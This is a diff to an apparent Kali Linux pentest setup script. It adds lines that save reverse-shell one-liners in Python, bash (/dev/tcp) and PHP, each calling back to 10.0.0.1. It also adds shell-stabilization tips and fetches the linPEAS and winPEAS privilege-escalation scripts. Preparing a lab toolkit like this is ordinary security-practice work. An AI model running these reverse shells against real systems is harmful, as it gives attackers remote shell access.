@@ -20,14 +20,19 @@ sudo apt install gedit
 
 
 #get and create files
-
-echo "one liners" > one-liner       #reverse shells
-echo "another" >> one-liner
-echo "yet another" >> one-liner
+      #reverse shells
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > one-liner   #python   
+echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> one-liner #bash
+echo "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" >> one-liner #php   #delimiters?
 mv one-liner /home/$USER/Downloads
 
+#shell stabalization
+echo "python3 -c ‘ import pty; pty.spawn("/bin/bash") ’" > shell-stab
+echo "if doesn’t work, use delimiter python3 -c "import pty; pty.spawn(\"/bin/bash\")"" >> shell-stab
+echo "ctrl+z" >> shell-stab 
+echo "stty raw -echo; fg" >> shell-stab
+echo " export TERM=xterm (pretty)" >>shell-stab
 
-echo 					#shell stablization
 mkdir /home/kali/Templates/post
 wget -P /home/kali/Templates/post https://github.com/carlospolop/PEASS-ng/releases/download/20220410/linpeas.sh #linpeas
 wget -P home/kali/Templates/post https://github.com/carlospolop/PEASS-ng/releases/download/20220410/winPEASx64.exe #winpeas
